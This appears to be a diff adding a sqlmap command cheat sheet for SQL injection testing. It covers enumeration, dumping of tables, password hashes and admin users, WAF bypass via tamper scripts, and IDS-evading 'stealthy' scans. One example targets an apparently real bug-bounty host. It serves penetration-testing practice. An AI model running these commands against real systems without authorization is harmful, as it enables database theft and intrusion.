@@ -1,0 +1,427 @@
+================================================================================
+                    SQLMAP COMMANDS REFERENCE GUIDE
+                        Complete Cheat Sheet
+================================================================================
+
+# CATEGORY 1: BASIC COMMANDS
+================================================================================
+
+# 1. SIMPLE URL
+sqlmap -u "http://target.com/page.php?id=1"
+
+# 2. URL WITH MULTIPLE PARAMETERS
+sqlmap -u "http://target.com/page.php?id=1&name=test&email=user@test.com"
+
+# 3. SPECIFIC PARAMETER TEST (only 'id')
+sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
+
+# 4. BATCH MODE (auto-yes all prompts)
+sqlmap -u "URL" --batch
+
+# 5. VERBOSITY LEVELS
+sqlmap -u "URL" -v 0  # Minimal
+sqlmap -u "URL" -v 1  # Normal (recommended)
+sqlmap -u "URL" -v 2  # Detailed
+sqlmap -u "URL" -v 3  # Very detailed
+sqlmap -u "URL" -v 4  # Full HTTP traffic
+
+
+# CATEGORY 2: POST REQUESTS (FORMS)
+================================================================================
+
+# 1. POST DATA (Login form)
+sqlmap -u "http://target.com/login.php" \
+  --data="username=admin&password=test&submit=Login"
+
+# 2. POST WITH SPECIFIC PARAMETER
+sqlmap -u "http://target.com/login.php" \
+  --data="username=admin&password=test&submit=Login" \
+  -p username
+
+# 3. POST WITH BATCH
+sqlmap -u "http://target.com/login.php" \
+  --data="username=admin&password=test" \
+  --batch --dbs
+
+
+# CATEGORY 3: COOKIES & HEADERS
+================================================================================
+
+# 1. COOKIE-BASED (session vulnerability)
+sqlmap -u "http://target.com/dashboard.php" \
+  --cookie="SESSIONID=abc123xyz789"
+
+# 2. HEADER INJECTION
+sqlmap -u "http://target.com/page.php" \
+  -H "User-Agent: Mozilla/5.0' OR '1'='1"
+
+# 3. CUSTOM HEADERS
+sqlmap -u "http://target.com/api" \
+  -H "Authorization: Bearer token123" \
+  -H "X-Custom-Header: value"
+
+# 4. REFERER HEADER
+sqlmap -u "http://target.com/page" \
+  --referer="http://target.com/previous"
+
+
+# CATEGORY 4: TESTING LEVEL & RISK
+================================================================================
+
+# LEVEL & RISK COMBINATION:
+# level: 1 (basic) to 5 (thorough)
+# risk: 1 (safe) to 3 (destructive)
+
+# 1. FAST & SAFE SCAN
+sqlmap -u "URL" --level=1 --risk=1 --batch
+
+# 2. MEDIUM SCAN
+sqlmap -u "URL" --level=2 --risk=2 --batch
+
+# 3. THOROUGH SCAN (slow but complete)
+sqlmap -u "URL" --level=5 --risk=3 --batch
+
+# 4. AGGRESSIVE SCAN (may cause issues)
+sqlmap -u "URL" --level=5 --risk=3 --threads=10 --batch
+
+
+# CATEGORY 5: DATABASE ENUMERATION
+================================================================================
+
+# 1. LIST ALL DATABASES
+sqlmap -u "URL" --dbs --batch
+
+# 2. CURRENT DATABASE
+sqlmap -u "URL" --current-db --batch
+
+# 3. CURRENT USER
+sqlmap -u "URL" --current-user --batch
+
+# 4. SPECIFIC DATABASE TABLES
+sqlmap -u "URL" -D database_name --tables --batch
+
+# 5. TABLE COLUMNS
+sqlmap -u "URL" -D database_name -T table_name --columns --batch
+
+# 6. DUMP FULL TABLE
+sqlmap -u "URL" -D database_name -T table_name --dump --batch
+
+# 7. DUMP SPECIFIC COLUMNS
+sqlmap -u "URL" -D database_name -T table_name \
+  -C "username,password,email" --dump --batch
+
+# 8. DUMP WITH WHERE CLAUSE
+sqlmap -u "URL" -D database_name -T table_name \
+  --dump --batch -X "id>10"
+
+# 9. DUMP ALL DATABASES
+sqlmap -u "URL" --dump-all --batch
+
+# 10. SCHEMAS LIST
+sqlmap -u "URL" --schemas --batch
+
+
+# CATEGORY 6: ADVANCED ENUMERATION
+================================================================================
+
+# 1. PASSWORD HASHES
+sqlmap -u "URL" --passwords --batch
+
+# 2. PRIVILEGES
+sqlmap -u "URL" --privileges --batch
+
+# 3. ROLES
+sqlmap -u "URL" --roles --batch
+
+# 4. SEARCH TABLES
+sqlmap -u "URL" --search -T password --batch
+
+# 5. SEARCH DATABASES
+sqlmap -u "URL" --search -D password --batch
+
+# 6. TABLE SEARCH (find 'admin' table)
+sqlmap -u "URL" -D database_name --search -T admin --batch
+
+
+# CATEGORY 7: INJECTION TECHNIQUES
+================================================================================
+
+# TECHNIQUES:
+# B = Boolean-based blind
+# E = Error-based
+# U = UNION query-based
+# S = Stacked queries
+# T = Time-based blind
+# Q = Inline queries
+
+# 1. ONLY UNION-BASED
+sqlmap -u "URL" --technique=U --batch
+
+# 2. ONLY BOOLEAN-BASED
+sqlmap -u "URL" --technique=B --batch
+
+# 3. ONLY TIME-BASED
+sqlmap -u "URL" --technique=T --batch
+
+# 4. MULTIPLE TECHNIQUES
+sqlmap -u "URL" --technique=BEUST --batch
+
+# 5. UNION QUERY COUNT
+sqlmap -u "URL" --technique=U --union-cols=5 --batch
+
+
+# CATEGORY 8: PROXY & NETWORKING
+================================================================================
+
+# 1. BURP SUITE PROXY
+sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch
+
+# 2. WITH BURP AUTHENTICATION
+sqlmap -u "URL" --proxy="http://user:pass@127.0.0.1:8080" --batch
+
+# 3. SOCKS5 PROXY
+sqlmap -u "URL" --proxy="socks5://127.0.0.1:1080" --batch
+
+# 4. TIMEOUT
+sqlmap -u "URL" --timeout=10 --batch
+
+# 5. RETRIES
+sqlmap -u "URL" --retries=3 --batch
+
+# 6. DELAY BETWEEN REQUESTS (stealth)
+sqlmap -u "URL" --delay=1 --batch
+
+# 7. THREADS (faster but aggressive)
+sqlmap -u "URL" --threads=5 --batch
+
+
+# CATEGORY 9: USER AGENT & HEADERS
+================================================================================
+
+# 1. RANDOM USER AGENT
+sqlmap -u "URL" --random-agent --batch
+
+# 2. SPECIFIC USER AGENT
+sqlmap -u "URL" --user-agent="Chrome/91.0" --batch
+
+# 3. CUSTOM USER AGENT
+sqlmap -u "URL" --user-agent="Custom/1.0" --batch
+
+
+# CATEGORY 10: CRAWLING & DISCOVERY
+================================================================================
+
+# 1. CRAWL WEBSITE (find all vulnerable pages)
+sqlmap -u "URL" --crawl=2 --batch
+
+# 2. CRAWL DEEPER
+sqlmap -u "URL" --crawl=5 --dbs --batch
+
+# 3. CRAWL + DUMP ALL
+sqlmap -u "URL" --crawl=2 --dump-all --batch
+
+
+# CATEGORY 11: WAF DETECTION & BYPASS
+================================================================================
+
+# 1. IDENTIFY WAF
+sqlmap -u "URL" --identify-waf --batch
+
+# 2. TAMPER SCRIPTS (bypass WAF)
+sqlmap -u "URL" --tamper=space2comment --batch
+sqlmap -u "URL" --tamper=between --batch
+sqlmap -u "URL" --tamper=charencode --batch
+sqlmap -u "URL" --tamper=appendnullbyte --batch
+
+# 3. MULTIPLE TAMPER SCRIPTS
+sqlmap -u "URL" --tamper=space2comment,between --batch
+
+# 4. SKIP WAF TEST
+sqlmap -u "URL" --skip-waf --batch
+
+
+# CATEGORY 12: JSON DATA (APIs)
+================================================================================
+
+# 1. JSON REQUEST
+sqlmap -u "http://api.target.com/users" \
+  --data='{"id":"1","name":"test"}' \
+  -H "Content-Type: application/json" \
+  --batch --dbs
+
+# 2. JSON WITH ARRAY
+sqlmap -u "http://api.target.com/search" \
+  --data='{"query":"test","filters":["all"]}' \
+  -H "Content-Type: application/json" \
+  --batch
+
+
+# CATEGORY 13: CUSTOM HTTP METHODS
+================================================================================
+
+# 1. PUT REQUEST
+sqlmap -u "http://target.com/api/users/1" \
+  --method=PUT \
+  --data="id=1&status=active" \
+  --batch --dbs
+
+# 2. DELETE REQUEST
+sqlmap -u "http://target.com/api/users/1" \
+  --method=DELETE \
+  --batch
+
+# 3. PATCH REQUEST
+sqlmap -u "http://target.com/api/users/1" \
+  --method=PATCH \
+  --data='{"name":"updated"}' \
+  --batch
+
+
+# CATEGORY 14: OUTPUT & REPORTING
+================================================================================
+
+# 1. SAVE TO FILE
+sqlmap -u "URL" --dbs --batch -o report.txt
+
+# 2. SAVE WITH ALL DUMPS
+sqlmap -u "URL" --dump-all --batch -o full_report.txt
+
+# 3. OUTPUT DIRECTORY
+sqlmap -u "URL" --dbs --batch --output-dir=/tmp/sqlmap_output
+
+# 4. CSV FORMAT
+sqlmap -u "URL" -D database_name -T table_name --dump --csv-del="," --batch
+
+
+# CATEGORY 15: REAL-WORLD EXAMPLES
+================================================================================
+
+# 1. DVWA SQL INJECTION TEST
+sqlmap -u "http://localhost:8080/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --batch -v 1 --dbs
+
+# 2. LOGIN FORM BRUTEFORCE
+sqlmap -u "http://target.com/login.php" \
+  --data="user=admin&pass=test" \
+  -p user --batch --level=2 --risk=2
+
+# 3. SYFE UAT LOGIN
+sqlmap -u "https://uat-bugbounty.nonprod.syfe.com/login" \
+  --data="email=admin@syfe.com&password=test" \
+  -p email --batch --dbs
+
+# 4. API ENDPOINT TEST
+sqlmap -u "https://api.target.com/v1/users/1" \
+  --proxy="http://127.0.0.1:8080" \
+  --batch --dbs
+
+# 5. FULL EXPLOITATION CHAIN
+sqlmap -u "URL" --batch --dbs
+sqlmap -u "URL" -D target_db --tables --batch
+sqlmap -u "URL" -D target_db -T admin_users --dump --batch
+sqlmap -u "URL" -D target_db -T config --dump --batch
+
+# 6. STEALTHY SCAN (avoid detection)
+sqlmap -u "URL" \
+  --batch \
+  --level=1 --risk=1 \
+  --delay=2 \
+  --random-agent \
+  --dbs
+
+
+# CATEGORY 16: QUICK REFERENCE
+================================================================================
+
+COMMAND PATTERN:
+sqlmap -u "URL" [OPTIONS] [ENUMERATION]
+
+OPTIONS:
+  -u URL                    → Target URL
+  -p parameter              → Specific parameter
+  --data="POST_DATA"        → POST parameters
+  --cookie="COOKIE"         → Cookie value
+  -H "HEADER"               → Custom header
+  --proxy="PROXY"           → Proxy settings
+  --batch                   → Auto-yes
+  -v LEVEL                  → Verbosity (0-4)
+  --level=1-5               → Testing level
+  --risk=1-3                → Risk level
+  --threads=N               → Parallel threads
+  --delay=SEC               → Delay between requests
+  --timeout=SEC             → Request timeout
+
+ENUMERATION:
+  --dbs                     → List databases
+  -D DB --tables            → List tables
+  -D DB -T TABLE --columns  → List columns
+  -D DB -T TABLE --dump     → Extract data
+  -C COL1,COL2 --dump       → Specific columns
+  --current-db              → Current database
+  --current-user            → Current user
+  --passwords               → Extract passwords
+  --privileges              → Database privileges
+  --identify-waf            → Detect WAF
+
+
+# CATEGORY 17: COMMON ERRORS & FIXES
+================================================================================
+
+ERROR: "Connection refused"
+FIX: Check if target is accessible
+     sqlmap -u "URL" --timeout=30
+
+ERROR: "No testable parameters"
+FIX: Specify parameter manually
+     sqlmap -u "URL" -p parameter_name
+
+ERROR: "Detected WAF"
+FIX: Use tamper scripts
+     sqlmap -u "URL" --tamper=space2comment
+
+ERROR: "Not injectable"
+FIX: Try different level/risk
+     sqlmap -u "URL" --level=5 --risk=3
+
+
+# CATEGORY 18: WORKFLOW CHECKLIST
+================================================================================
+
+1. INITIAL SCAN (5 min)
+   sqlmap -u "URL" --batch -v 1
+
+2. DATABASE LIST (2 min)
+   sqlmap -u "URL" --dbs --batch
+
+3. TABLES LIST (2 min)
+   sqlmap -u "URL" -D database_name --tables --batch
+
+4. DATA DUMP (5 min)
+   sqlmap -u "URL" -D database_name -T table_name --dump --batch
+
+5. SENSITIVE DATA (5 min)
+   sqlmap -u "URL" -D database_name -T admin_users --dump --batch
+
+6. REPORT (10 min)
+   Take screenshots + document findings
+
+
+# TIPS & BEST PRACTICES
+================================================================================
+
+1. Always use --batch in automated scanning
+2. Start with --level=1 --risk=1 (safe)
+3. Use --proxy to monitor with Burp Suite
+4. Add --delay=1-2 for stealth (avoid IDS/WAF)
+5. Use --random-agent to spoof user agent
+6. Test specific parameters with -p flag
+7. Check --identify-waf before scanning
+8. Use --tamper scripts for WAF bypass
+9. Save output with -o flag for reports
+10. Always test on authorized targets only!
+
+================================================================================
+                        CREATED: 2026-07-11
+                        PURPOSE: SQLMap Reference
+                        USAGE: Terminal mein view karna
+================================================================================
